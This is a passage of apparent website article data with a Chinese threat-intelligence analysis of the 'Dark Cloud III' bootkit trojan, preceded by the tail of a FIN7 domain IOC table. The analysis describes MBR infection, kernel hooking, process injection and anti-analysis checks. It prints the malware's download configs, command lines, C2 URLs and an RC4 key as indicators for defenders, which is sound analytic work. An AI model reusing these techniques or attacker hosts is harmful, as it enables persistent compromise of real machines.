3:07</td>\n<td></td>\n</tr>\n<tr>\n<td>www.vxqt.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:06</td>\n<td></td>\n</tr>\n<tr>\n<td>www.cgqy.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:07</td>\n<td></td>\n</tr>\n<tr>\n<td>www.wfsv.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:07</td>\n<td></td>\n</tr>\n<tr>\n<td>www.palj.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:09</td>\n<td></td>\n</tr>\n<tr>\n<td>www.idjb.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:09</td>\n<td></td>\n</tr>\n<tr>\n<td>www.zjav.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:09</td>\n<td></td>\n</tr>\n<tr>\n<td>www.mewt.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:06</td>\n<td></td>\n</tr>\n<tr>\n<td>www.vkpo.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:07</td>\n<td></td>\n</tr>\n<tr>\n<td>www.wqiy.info</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 19:08</td>\n<td></td>\n</tr>\n<tr>\n<td>www.wvzu.pw</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 0:00</td>\n<td></td>\n</tr>\n<tr>\n<td>www.gxhp.top</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 19:07</td>\n<td></td>\n</tr>\n<tr>\n<td>www.hvzr.info</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 19:07</td>\n<td></td>\n</tr>\n<tr>\n<td>www.reld.info</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 0:00</td>\n<td></td>\n</tr>\n<tr>\n<td>www.vqba.info</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 19:06</td>\n<td></td>\n</tr>\n<tr>\n<td>www.oxrp.info</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 19:08</td>\n<td></td>\n</tr>\n<tr>\n<td>www.dvso.pw</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 0:00</td>\n<td></td>\n</tr>\n<tr>\n<td>www.bvyv.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.bwuk.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.cihr.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.coec.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.oyaw.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.pbbk.us</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.ppdx.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.pvze.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.qefg.info</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.qlpa.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.ueox.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.ufyb.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.dbxa.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.eady.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.enuv.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.eter.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.utca.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.vdfe.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.vjro.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.fbjz.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.fhyi.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.futh.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.gnoa.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.vwcq.us</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.jimw.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.jomp.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.jxhv.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.kshv.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.ysxy.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.zmyo.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.zody.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.lhlv.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.lnoy.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.lvrm.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.mfka.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.nxpu.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.oaax.site</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.odyr.us</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.oknz.club</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.ooep.pw</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>www.ckwl.pw</td>\n<td>Lin Shi Mo Ban</td>\n<td>2015/11/11 0:00</td>\n<td>不能作为IOC</td>\n</tr>\n<tr>\n<td>www.zcnt.pw</td>\n<td>Lin Shi Mo Ban</td>\n<td>2015/11/16 0:00</td>\n<td>不能作为IOC</td>\n</tr>\n</tbody>\n</table>\n<h2 class="line" data-line="203">参考链接</h2>\n<p class="line" data-line="205"><a href="https://www.fireeye.com/blog/threat-research/2017/03/fin7_spear_phishing.html">fireeye-fin7 spear phishing</a></p>\n',category:"专题报告",__v:1,abstract:"2017年3月，FireEye发布了一篇名黑客组织FIN7的APT攻击简报，报告称FIN7组织以钓鱼邮件为攻击渠道，主要对美国金融机构渗透攻击。组织的攻击利用DNS协议的TXT字段进行C&C通信。360威胁情报中心对此APT组织的攻击链条进行了梳理，对木马相关的技术进行了分析，揭示其一些有意思的技巧。",modify_time:"2017-07-26T12:03:20.346Z",readableId:"fin7-apt-campaign-backdoor-analysis",publish_time:"2017-06-19T09:00:13.000Z",insert_time:"2017-07-25T12:03:51.314Z",isDraft:!1,tags:["Fin7","APT","Backdoor"]},{_id:"597733a71c670a09e493ee3f",title:"暗云III木马技术分析报告",author:"admin",content:'<h1 class="line" data-line="0">事件背景</h1>\n<p class="line" data-line="2">2017年6月9日，关于一款名为“暗云III”木马的信息在互联网传播，据称此木马具有隐蔽性强、潜在危害大、传播范围广等特点。木马主要通过外挂、游戏辅助、私服登录器等传播，此类软件通常诱导用户关闭安全软件后使用，使得木马得以乘机植入。木马主要通过云控进行任务发布，传播及执行恶意功能时无文件写入磁盘，同时木马所具有的bootkit能力也使得木马的运行更加隐而且难以查杀。本报告对木马的相关技术进行分析，并提供解决方法和检查确认建议。</p>\n<h2 class="line" data-line="4">目标样本</h2>\n<p class="line" data-line="6">360威胁情报中心得到了如下木马相关的样本，相关的基本信息如下：</p>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td class="text-right"><strong>Hash</strong></td>\n<td>BC5DEA3605878631B8FEEEB53BFB5B17</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件类型</strong></td>\n<td>Win32 EXE</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件大小</strong></td>\n<td>1669784字节</td>\n</tr>\n<tr>\n<td class="text-right"><strong>时间戳</strong></td>\n<td>2016.12.24 16:52:15</td>\n</tr>\n<tr>\n<td class="text-right"><strong>首次上传VirusTotal时间</strong></td>\n<td>2017-03-15 07:19:09 UTC</td>\n</tr>\n<tr>\n<td class="text-right"><strong>Hash</strong></td>\n<td>518f9e5b1fb6397a27a0851930625049</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件类型</strong></td>\n<td>Win32 EXE</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件大小</strong></td>\n<td>48462字节</td>\n</tr>\n<tr>\n<td class="text-right"><strong>时间戳</strong></td>\n<td>2016.12.16 19:56:11</td>\n</tr>\n<tr>\n<td class="text-right"><strong>首次上传VirusTotal时间</strong></td>\n<td>2017-05-24 22:33:38 UTC</td>\n</tr>\n</tbody>\n</table>\n</center>\n<h2 class="line" data-line="23">样本分析</h2>\n<h3 class="line" data-line="25">安装程序分析</h3>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td class="text-right"><strong>Hash</strong></td>\n<td>BC5DEA3605878631B8FEEEB53BFB5B17</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件类型</strong></td>\n<td>Win32 EXE</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件大小</strong></td>\n<td>1669784字节</td>\n</tr>\n<tr>\n<td class="text-right"><strong>时间戳</strong></td>\n<td>2016.12.24 16:52:15</td>\n</tr>\n<tr>\n<td class="text-right"><strong>首次上传VirusTotal时间</strong></td>\n<td>2017-03-15 07:19:09 UTC</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="37">样本功能：</p>\n<p class="line" data-line="39">样本运行后显示正常游戏界面，会在后台解密payload，并在内存中动态到payload入口点执行，payload会搜集本机信息，拼接本机信息做为配置文件的下载地址，使用URLDownloadToFile下载配置文件，解析配置文件中的url字段、cmdline等字段，下载url字段中的内容并在内存中加载执行。</p>\n<p class="line" data-line="41">样本运行，显示正常游戏界面：</p>\n<p class="text-center line" data-line="43"><img src="/uploads/2017/07/25/8d3855a37f8ffd02687f20f6453d09d2.png" alt="" width="90%"></p>\n<p class="line" data-line="45">使用CallWindowProcW注册窗口事件：</p>\n<p class="text-center line" data-line="47"><img src="/uploads/2017/07/25/82fb7aa498073b3e2954ccae8cd970be.png" alt="" width="90%"></p>\n<p class="line" data-line="49">在窗口处理函数中，查找89号资源，加载该图片资源，在该图片资源图片偏移ED7C的位置，保存着可以执行的代码：</p>\n<p class="text-center line" data-line="51"><img src="/uploads/2017/07/25/5f9634e9176ef02f8ea69cb1b2350fd7.png" alt="" width="90%"></p>\n<p class="line" data-line="53">将图片偏移ED7C处的代码复制到新申请的内存中。</p>\n<p class="text-center line" data-line="55"><img src="/uploads/2017/07/25/741f41debd244b71db0a22d1a5f4c6a2.png" alt="" width="90%"></p>\n<p class="line" data-line="57">这段代码包含两部分内容：</p>\n<p class="text-center line" data-line="59"><img src="/uploads/2017/07/25/3e31f618818bf21ed704b04d4d8a4049.png" alt="" width="90%"></p>\n<p class="line" data-line="61">运行这段代码时，首先会运行前面部分的shellcode内容，shellcode会使用RtlDecompressBuffer函数在内存中解压被压缩过的PE文件：</p>\n<p class="text-center line" data-line="63"><img src="/uploads/2017/07/25/e7ea049d373a454193a95dad49ea0d20.png" alt="" width="90%"></p>\n<p class="line" data-line="65">对解压缩出的PE文件进行内存动态加载后到入口点执行：</p>\n<p class="text-center line" data-line="67"><img src="/uploads/2017/07/25/bd602bc9d44b44c728009b668ac44b87.png" alt="" width="90%"></p>\n<p class="line" data-line="69">这个内存解密出来的样本的功能为：</p>\n<p class="line" data-line="71">检测本机的环境（包括是否安装有360安全软件，是否是网吧环境，是否是虚拟机环境等），将收集到的客户端信息发送到http://c2tongji.b5156.com:89，服务器根据对本机环境做出判断返回不同内容。只有在满足特定环境的情况下，才会返回带有恶意下载链接的配置文件。而在木马的运行环境不符合木马作者的预期时，则不会返回恶意配置文件，以此来逃避安全软件查杀。</p>\n<p class="line" data-line="73">检测虚拟机的代码片段：</p>\n<p class="text-center line" data-line="75"><img src="/uploads/2017/07/25/54973d048e7febe6b07039866cae4eea.png" alt="" width="90%"></p>\n<p class="line" data-line="77">检测360安全软件的代码片段：</p>\n<p class="text-center line" data-line="79"><img src="/uploads/2017/07/25/e291e320f4497ac980561387b51413da.png" alt="" width="90%"></p>\n<p class="line" data-line="81">检测是否是网吧环境的代码片段：</p>\n<p class="text-center line" data-line="83"><img src="/uploads/2017/07/25/2c5253cef83ef09e1bc914411790624b.png" alt="" width="90%"></p>\n<p class="line" data-line="85">搜集用户信息，通过URLDownloadToFile下载配置文件到本地：</p>\n<p class="text-center line" data-line="87"><img src="/uploads/2017/07/25/7187ef685aaa1b25f1cce49994fa6c70.png" alt="" width="90%"></p>\n<p class="line" data-line="89">下载回来的配置文件的格式为：</p>\n<pre class="hljs"><code class="hljs">[Update] \n\nVersion=2 \nUrl=http://update.njmmy.com:8089/config/LDrvSvc.zip \nCmdLine=rundll32.exe LDrvSvc.dll,RundllInstall \nDir=%appdata%\\\\LDrvSvc\n</code></pre>\n<p class="line" data-line="100">随后对下载回来的配置文件进行解析后，使用CreateProcess加载从配置文件中URL字段的内容：</p>\n<p class="text-center line" data-line="102"><img src="/uploads/2017/07/25/3a276293536a6aae76052c69bd5e0009.png" alt="" width="90%"></p>\n<p class="line" data-line="104">此时下载的内容经过解密后在内存中执行，会尝试改写MBR。</p>\n<h4 class="line" data-line="106">MBR的改写</h4>\n<p class="line" data-line="108">此阶段木马的主要功能为：从上面的配置中下载回来的zip包中包含了驱动人生的白样本，木马利用驱动人生的白样本文件会尝试加载名为DtlCrashCatch.dll文件，而此文件是攻击者所提供的恶意代码，这是典型的白加黑绕过杀软的技巧，被国内恶意代码开发者所广泛使用。DtlCrashCatch.dll文件会从http://www.2tf1.com/upcfg.db 得到URL,从那个URL指向位置下载加密过的内容，在本地内存中解密后加载执行尝试修改用户计算机硬盘的MBR。</p>\n<p class="line" data-line="110">被恶意利用的白签名文件：</p>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td class="text-right"><strong>Hash</strong></td>\n<td>b3a4d017e51da2a3aef520d4836c6dc6</td>\n</tr>\n<tr>\n<td class="text-right"><strong>签名信息</strong></td>\n<td>Shenzhen DriveTheLife Software Technology Co.Ltd</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="text-center line" data-line="119"><img src="/uploads/2017/07/25/1f3867e09ed33b793a5d289b29c97a5b.png" alt=""></p>\n<p class="line" data-line="121">具体的过程为：</p>\n<p class="line" data-line="123">通过调用“rundll32.exe LDrvSvc.dll,RundllInstall Dir=%appdata%\\LDrvSvc”命令，将调用LDrvSvc.dll的RundllInstall函数,在RundllInstall函数中调用了HostInstall函数。</p>\n<p class="text-center line" data-line="125"><img src="/uploads/2017/07/25/85b5ec0409f383567f0b1549b690dacb.png" alt=""></p>\n<p class="line" data-line="127">而HostInstall函数会将在系统中注册LDrvSvc服务。</p>\n<p class="text-center line" data-line="129"><img src="/uploads/2017/07/25/3d6bec505975067b32d8763a840beb0c.png" alt="" width="99%"></p>\n<p class="line" data-line="131">随后以服务方式启动LDrvSvc.dll，这时会进入LDrvSvc.dll的ServiceMain函数。ServiceMain函数会加载DtlCrashCatch.dll文件</p>\n<p class="text-center line" data-line="133"><img src="/uploads/2017/07/25/298ad7bf8935ff4ead3d9db5c196f408.png" alt="" width="90%"></p>\n<p class="line" data-line="135">最终会调用DtlCrashCatch.dll的1001E889代码处：</p>\n<p class="text-center line" data-line="137"><img src="/uploads/2017/07/25/e0518563c8f545b78b5f883786ca2eab.png" alt=""></p>\n<p class="line" data-line="139">上述代码功能为通过CreateFileMapping和MappingViewOfFile解密指定尾部数据到一个共享内存，解密到共享内存中的代码shellcode，功能为调用RtlDecompressBuffer解密出PE并到PE入口点处执行。</p>\n<p class="line" data-line="141">这个PE的功能为从http://www.2tf1.com/upcfg.db下载文件，将文件使用RC4算法解密，并判断下载回来的文件前4个字节是不是0xA5A5A5A5，如果满足条件则从解密后的第4个字节处开始执行。</p>\n<p class="line" data-line="143">此处使用的RC4密钥的十六进制表示为：</p>\n<blockquote>\n<p>F4 70 75 3D 21 B7 D8 95 BE 49 48 C1 56 F6 A9 C1</p>\n</blockquote>\n<p class="line" data-line="147">下载配置文件代码片段：</p>\n<p class="text-center line" data-line="149"><img src="/uploads/2017/07/25/c95671370be5e1961e9eeef2cfbf49cc.png" alt=""></p>\n<p class="line" data-line="151">RC4解密后，比较0xA5A5A5A5代码片段：</p>\n<p class="text-center line" data-line="153"><img src="/uploads/2017/07/25/2c2b82a1842430ea939c019fcae7d322.png" alt=""></p>\n<p class="line" data-line="155">从解密出的代码+4处开始执行后，又会执行与前面类似的解密过程，先通过RtlDecompressBuffer解压缩代码后面部分压缩过的PE文件数据，随后动态加载PE后，到PE入口点执行。</p>\n<p class="line" data-line="157">这时解压缩的代码片段：</p>\n<p class="text-center line" data-line="159"><img src="/uploads/2017/07/25/ff178268784de66dbfc2e790fe8f0aba.png" alt="" width="90%"></p>\n<p class="line" data-line="161">内存加载PE代码片段：</p>\n<p class="text-center line" data-line="163"><img src="/uploads/2017/07/25/89ee096572aa2ca4e893c3ceccdafad7.png" alt="" width="90%"></p>\n<p class="line" data-line="165">内存中加载的这个PE文件才是最终真正的修改MBR的PE。</p>\n<p class="line" data-line="167">加载到内存后，判断ldrvsvc.dll模块的0x156C处是否为“0x8B 0x44 0x24 0x04 0x83 0xE8 0x01”（用来判断是不是已经被patch过），如果判断通过，就将ldrvsvc.dll模块的0x156C patch为”jmp 4C62D”：</p>\n<p class="text-center line" data-line="169"><img src="/uploads/2017/07/25/ffebc399af572d163059cbd8801783cb.png" alt="" width="90%"></p>\n<p class="line" data-line="171">用来对ldrvsvc.dll做patch的代码：</p>\n<p class="text-center line" data-line="173"><img src="/uploads/2017/07/25/eaa5a92ca28ffa2585bb5b50f2cc0cb6.png" alt=""></p>\n<p class="line" data-line="175">被patch后的ldrvsvc.dll，最终会被服务调用，进而执行写入MBR操作。为了防止对MBR的重复写入，木马在写入MBR操作前，会比较MBR是不是特征代码片段：</p>\n<blockquote>\n<p>31 C0 FA 31 DB 8E D3 36 89 26 FE 7B BC FE 7B 1E 66 60 8E DB 3E A1 13 04 24 FC 83 E8 40 3E A3 13</p>\n</blockquote>\n<p class="line" data-line="179">比较MBR是否已经被写入的代码片段：</p>\n<p class="text-center line" data-line="181"><img src="/uploads/2017/07/25/e9919d54440cdbb858292dcc0706ec22.png" alt=""></p>\n<p class="line" data-line="183">木马会把原始的MBR备份到系统第二扇区中，同时在第一扇区中写入恶意代码，在3-63扇区中写入加密过的恶意代码：</p>\n<p class="text-center line" data-line="185"><img src="/uploads/2017/07/25/9303d0fa513bcc7f95d6a2610f3229a9.png" alt="" width="90%"></p>\n<h4 class="line" data-line="187">Bootkit功能分析</h4>\n<p class="line" data-line="189">bootkit功能主要：在内核以TDI 的方式访问网络下载shellcode解密后直接在内核中运行。木马在TDI层用udp连接访问ms.maimai666.com的8064端口获取shellcode。如果失败改用tcp连接ms.maimai666.com的8864获取。得到的内容会在内存中解密，解密后以APC的形式插入到应用层进程中。插入到应用层的代码功能主要为：根据配置文件从 http://www.acsewle.com:8877/ds/cl.db 下载加密后的文件，文件解密后的样本功能在下一小节中分析。</p>\n<p class="line" data-line="191">由上一节对MBR写入过程的调试发现写入MBR后，系统第1个扇区的内容变为下图所示，这是木马的病毒代码：</p>\n<p class="text-center line" data-line="193"><img src="/uploads/2017/07/25/71529405f6d1bac7201e01935973b684.png" alt=""></p>\n<p class="line" data-line="195">系统第1扇区的代码功能为：将磁盘3-63扇区的木马主体加载到内存中解密执行。</p>\n<p class="line" data-line="197">解密部分代码片段：</p>\n<p class="text-center line" data-line="199"><img src="/uploads/2017/07/25/6c3762f4e13d6b9ae103399f3e440642.png" alt=""></p>\n<p class="line" data-line="201">这部分解密代码的功能是：挂钩系统的15号中断，随后读取第二扇区中的备份MBR正常地引导系统启动。</p>\n<p class="line" data-line="203">挂钩系统的15号中断代码片段：</p>\n<p class="text-center line" data-line="205"><img src="/uploads/2017/07/25/3bd39c11abd44bf2895bdd954e50eeeb.png" alt=""></p>\n<p class="line" data-line="207">挂钩成功后，使用第二扇区中备份的系统MBR正常地引导启动：</p>\n<p class="text-center line" data-line="209"><img src="/uploads/2017/07/25/6fe270ce10943e6b8b4716e24f5546dc.png" alt=""></p>\n<p class="line" data-line="211">INT 15中断向量被挂钩前后对比图：</p>\n<p class="text-center line" data-line="213"><img src="/uploads/2017/07/25/7cb1bab3e81c2ef56c7a341beb23469b.png" alt=""></p>\n<p class="line" data-line="215">随后，bootkit会挂钩BILoadImageEx函数、ntoskrnl入口点等。此外，木马还会根据磁盘类型和操作系统替换DriverStartIo、 AtapiHwStartIo、RaUnitStartIo等函数，从而阻止其他程序读取磁盘原始MBR。当检测到读MBR时，返回一个正常的MBR，检测到写MBR时，则直接忽略该操作。这就导致了系统中毒之后，如果木马作者没有打开云控开关的情况会，很难察觉电脑中毒。</p>\n<p class="line" data-line="217">这样，当系统下次启动时，系统引导会通过int 15中断查询内存信息，此时挂钩15号中断的木马便得以第二次获得CPU控制权，获得控制权后木马挂钩BILoadImageEx函数，调用原始15号中断并将控制权交回给系统继续引导。</p>\n<p class="line" data-line="219">当系统引导代码调用BILoadImageEx加载ntoskrnl.exe时，木马便第三次获得控制权，获得控制权后木马再一次执行挂钩操作，此次挂钩的位置是ntoskrnl.exe的入口点，随后将控制权交给系统继续引导。</p>\n<p class="line" data-line="221">当引导完毕进入windows内核时，挂钩ntoskrnl入口点的木马代码第四次获得CPU控制权，此时木马已真正进入windows内核中，获得控制权后，分配一块内存空间，将木马内核的主功能代码拷贝到分配的空间中，并通过创建PsSetCreateThreadNotifyRoutine回调的方式使主功能代码得以执行。至此完成木马由MBR到windows内核的加载过程<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup> <sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup> <sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>。</p>\n<h3 class="line" data-line="223">Bootkit所加载木马的分析</h3>\n<p class="line" data-line="225">对bootkit从云端加载的木马进行分析，文件基本信息：</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Hash</strong></td>\n<td>518f9e5b1fb6397a27a0851930625049</td>\n</tr>\n<tr>\n<td><strong>文件类型</strong></td>\n<td>Win32 EXE</td>\n</tr>\n<tr>\n<td><strong>文件大小</strong></td>\n<td>48462字节</td>\n</tr>\n<tr>\n<td><strong>时间戳</strong></td>\n<td>2016.12.16 19:56:11</td>\n</tr>\n<tr>\n<td><strong>首次上传VirusTotal时间</strong></td>\n<td>2017-05-24 22:33:38 UTC</td>\n</tr>\n</tbody>\n</table>\n<p class="line" data-line="235">样本功能：</p>\n<p class="line" data-line="237">访问http://www.acsewle.com:8877/ds/kn.html下载配置文件，解析配置文件中的appurl字段，下载appurl字段的url，根据配置文件中ispe为1，则通过CreateProcess直接加载执行。如果配置文件中ispe为0，则解析下载回来的非PE文件，RC4解密该非PE文件，得到PE加载代码与PE文件，以傀儡进程方式注入svchost.exe，，最后通过解密出来的PE加密代码加载解密出来的PE文件。</p>\n<p class="line" data-line="239">细节如下：</p>\n<p F020C369-7CD6-41ea-A91F-3C52F1B72D0B="" class="line" data-line="241">通过事件实现单一进程运行的，事件名：</p>\n<p class="text-center line" data-line="243"><img src="/uploads/2017/07/25/ee925085321838256ca7379b7d541a5c.png" alt="" width="90%"></p>\n<p class="line" data-line="245">下载配置文件到临时文件中：</p>\n<p class="text-center line" data-line="247"><img src="/uploads/2017/07/25/ac003626642fae3c6d6fd7333b850b35.png" alt="" width="90%"></p>\n<p class="line" data-line="249">访问http://www.acsewle.com:8877/ds/kn.html</p>\n<p class="text-center line" data-line="251"><img src="/uploads/2017/07/25/1995c6346babc733157075ea21684beb.png" alt="" width="90%"></p>\n<pre class="hljs"><code class="hljs">[Config] \n\nversion = 890 \nisexe = 0 \nappurl = http://www.acsewle.com:8877/ds/lcdn.db\n</code></pre>\n<p class="line" data-line="261">解析CONFIG中的配置项目：</p>\n<p class="text-center line" data-line="263"><img src="/uploads/2017/07/25/7c89e9c3ef5433b36e5e3d3a8b485eb0.png" alt="" width="90%"></p>\n<p class="line" data-line="265">解析出 appurl后，会下载appurl的地址到临时文件。</p>\n<p class="line" data-line="267">下载回来的代码如下：</p>\n<p class="text-center line" data-line="269"><img src="/uploads/2017/07/25/8011249a08c35bcff43e61df03a865c6.png" alt="" width="90%"></p>\n<p class="line" data-line="271">其中的格式为：</p>\n<p class="line" data-line="273">前面8字节为“SLDREXEC”，标识字符，图中黑色框部分。绿色框部分为加密过的shellcode的长度。红色框部分为加密shellcode时使用的RC4密钥。褐色框部分为加密过的shellcode的内容。</p>\n<p class="line" data-line="275">使用RC4算法将上面的褐色框部分解密后的内容分为两部分：</p>\n<p class="line" data-line="277">第一部分为代码片段，用于动态加载PE文件</p>\n<p class="line" data-line="279">第二部分为完整的PE文件，从文件偏移0x328处就是一个完整的PE文件。</p>\n<p class="line" data-line="281">PE文件片段如下：</p>\n<p class="text-center line" data-line="283"><img src="/uploads/2017/07/25/1b869ed9bd514c6c38358ca3f43d7a7a.png" alt=""></p>\n<p class="line" data-line="285">解密出来的注入代码如下：</p>\n<p class="text-center line" data-line="287"><img src="/uploads/2017/07/25/e99266a00fd896a3fa8c4170c2fb1524.png" alt=""></p>\n<p class="line" data-line="289">将上面解密出的内容注入到svchost.exe中执行：</p>\n<p class="text-center line" data-line="291"><img src="/uploads/2017/07/25/b3d8df3c0753fb1471a8d799438fc0fe.png" alt=""></p>\n<p class="line" data-line="293">注入到svhost.exe中的代码包含上面所有的解密内容（包括代码片段与完整的PE文件）。</p>\n<p class="line" data-line="295">代码片段的功能是动态获得函数地址，在内存中加载解密出的PE文件：</p>\n<p class="text-center line" data-line="297"><img src="/uploads/2017/07/25/87dd47533d79cd2cf6f30413e34b0a03.png" alt=""></p>\n<p class="line" data-line="299">内存加载PE并到入口点执行</p>\n<p class="text-center line" data-line="301"><img src="/uploads/2017/07/25/aff38627a0c9b0bc69e7fa6ffafcffe3.png" alt=""></p>\n<p class="line" data-line="303">Payload使用了UPX压缩。Payload的功能为，从网上下载lua脚本保存到临时文件，随后使用PE中内置的lua解析程序运行下载的lua脚本。</p>\n<p class="line" data-line="305">从http://www.acsewle.com:8877/ld/ndn.db下载lua脚本到本地：</p>\n<p class="text-center line" data-line="307"><img src="/uploads/2017/07/25/7c279c462a1596b8df87df2f5e2c222c.png" alt="" width="90%"></p>\n<p class="line" data-line="309">使用PE中内置的lua解析器执行lua脚本：</p>\n<p class="text-center line" data-line="311"><img src="/uploads/2017/07/25/9447657683fe2e8c03b9beb7405af3dc.png" alt="" width="90%"></p>\n<p class="line" data-line="313">木马根据云端配置不同的lua脚本实现不同的功能。主要不同的lua的功能包括：统计受害机器信息功能，发动DDOS攻击功能，发起CC攻击功能等。</p>\n<h2 class="line" data-line="315">解决方案</h2>\n<p class="line" data-line="317">从以上的技术分析可以看到，暗云木马感染了MBR，即使重装系统，MBR里的恶意代码还会联网下载木马病毒执行。目前比较稳妥的解决办法是使用360急救箱的强力模式进行系统扫描，360急救箱强力模式会重启系统先于木马启动，从而彻底清除MBR中恶意代码，恢复系统正常MBR。</p>\n<p class="line" data-line="319">360急救箱下载地址：<a href="http://down.360safe.com/360c0mpkill5.1.64.1183-0605.zip">http://down.360safe.com/360c0mpkill5.1.64.1183-0605.zip</a></p>\n<h2 class="line" data-line="321">IOC</h2>\n<p class="line" data-line="323">由于木马一旦感染会先于操作系统启动，在本地进行检查会变得非常困难，但由于木马有相对固定的网络行为，由于可以在网络出口尝试匹配如下URL及相应域名访问尝试，由可以比较有效低成本的发现中招系统。我们提供如下的URL IOC：</p>\n<p class="line" data-line="325">http://www.acsewle.com:8877/ds/kn.html</p>\n<p class="line" data-line="327">http://ms.maimai666.com</p>\n<p class="line" data-line="329">http://www.acsewle.com:8877/ds/cl.db</p>\n<p class="line" data-line="331">http://www.acsewle.com:8877/ds/lcdn.db</p>\n<p class="line" data-line="333">http://www.acsewle.com:8877/ds/ndn.db</p>\n<p class="line" data-line="335">http://www.2tf1.com/upcfg.db</p>\n<p class="line" data-line="337">http://update.njmmy.com:8089/config/LDrvSvc.zip</p>\n<p class="line" data-line="339">http://www.acsewle.com:8877/um.php</p>\n<h2 class="line" data-line="341">参考信息</h2>\n<hr class="footnotes-sep">\n<section class="footnotes">\n<ol class="footnotes-list">\n<li id="fn1" class="footnote-item"><p><a href="http://bbs.guanjia.qq.com/forum.php?mod=viewthread&amp;tid=5307974">http://bbs.guanjia.qq.com/forum.php?mod=viewthread&amp;tid=5307974</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>\n</li>\n<li id="fn2" class="footnote-item"><p><a href="https://mp.weixin.qq.com/s/MYbSHWHE4qpa0XJ3N6nAzw">https://mp.weixin.qq.com/s/MYbSHWHE4qpa0XJ3N6nAzw</a> <a href="#fnref2" 